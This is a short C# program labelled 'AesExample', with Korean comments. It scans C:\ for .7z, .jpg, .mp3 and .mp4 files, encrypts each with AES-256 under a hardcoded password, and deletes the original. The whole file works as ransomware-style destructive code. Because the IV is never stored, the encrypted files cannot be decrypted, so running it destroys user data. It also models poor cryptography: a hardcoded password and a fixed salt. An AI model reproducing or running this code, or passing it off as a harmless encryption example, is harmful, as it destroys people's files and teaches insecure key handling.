using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class AesExample
{
    public static void Main()
    {
        string targetDirectory = @"C:\";
        string[] fileEntries = Directory.GetFiles(targetDirectory);

        // 비밀번호와 솔트 값을 설정하세요.
        string password = "비밀번호";
        string salt = "16";

        // Rfc2898DeriveBytes 객체 생성
        var keyGenerator = new Rfc2898DeriveBytes(password, Encoding.UTF8.GetBytes(salt));

        // 32 bytes for AES-256
        byte[] keyArray = keyGenerator.GetBytes(32);

        foreach (string fileName in fileEntries)
        {
            if (Path.GetExtension(fileName) == ".7z" || Path.GetExtension(fileName) == ".jpg" ||
                Path.GetExtension(fileName) == ".mp3" || Path.GetExtension(fileName) == ".mp4")
            {
                EncryptFile(fileName, keyArray);
            }
        }
    }

    static void EncryptFile(string inputFile, byte[] keyArray)
    {
        try
        {
            using (AesManaged aes = new AesManaged())
            {
                aes.KeySize = 256; // AES-256 암호화 설정
                aes.BlockSize = 128;
                aes.Key = keyArray;

                ICryptoTransform transform = aes.CreateEncryptor();

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open))
                using (FileStream fsEncrypted =
                    new FileStream(inputFile + ".enc", FileMode.Create))
                using (CryptoStream cryptostream =
                    new CryptoStream(fsEncrypted, transform, CryptoStreamMode.Write))
                    fsInput.CopyTo(cryptostream);
            }

            File.Delete(inputFile); // 원본 파일 삭제. 필요에 따라 주석 처리 가능.

            Console.WriteLine("Encryption done for file: " + inputFile);

        }
        catch (Exception e)
        {
            Console.WriteLine("An error occurred: {0}", e.Message);
            return;
        }
    }
}
